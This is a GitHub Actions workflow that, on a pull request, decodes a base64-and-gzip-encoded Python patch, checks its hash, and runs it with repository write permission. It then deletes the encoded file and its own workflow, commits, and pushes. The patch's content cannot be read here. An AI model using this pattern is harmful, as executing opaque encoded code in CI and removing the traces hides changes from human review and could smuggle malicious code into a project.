name: Bootstrap clients discovery CA fix

on:
  pull_request:
    paths:
      - '.bootstrap/patch-discovery-ca.py.gz.b64'
      - '.github/workflows/bootstrap-clients-discovery-ca.yml'

permissions:
  contents: write

concurrency:
  group: bootstrap-clients-discovery-ca-${{ github.event.pull_request.number }}
  cancel-in-progress: true

jobs:
  patch:
    if: github.event.pull_request.head.repo.full_name == github.repository
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
        with:
          ref: ${{ github.event.pull_request.head.ref }}
          token: ${{ github.token }}
          show-progress: false
      - uses: actions/setup-python@ece7cb06caefa5fff74198d8649806c4678c61a1
        with:
          python-version: '3.12'
      - name: Apply and validate the verified-CA patch
        shell: bash
        run: |
          set -euo pipefail
          base64 --decode .bootstrap/patch-discovery-ca.py.gz.b64 | gzip --decompress > /tmp/patch-discovery-ca.py
          echo '125e47a18a7c7b141bc654bb2e9300267cdb1fc9d0c9beb0ecc258c9c45f30e8  /tmp/patch-discovery-ca.py' | sha256sum --check --strict
          python /tmp/patch-discovery-ca.py
          python -m py_compile tools/discover_clients_fleet.py tools/test_discover_clients_fleet.py
          python -m unittest -v tools/test_discover_clients_fleet.py tools/test_run_clients_batch.py
      - name: Replace bootstrap files with readable source
        shell: bash
        run: |
          set -euo pipefail
          rm -rf .bootstrap
          rm .github/workflows/bootstrap-clients-discovery-ca.yml
          git config user.name 'zed-pkg automation'
          git config user.email 'zed-pkg-automation@users.noreply.github.com'
          git add -A
          git commit -m 'fix: use runner trust store for GitHub discovery'
          git push origin HEAD:${{ github.event.pull_request.head.ref }}
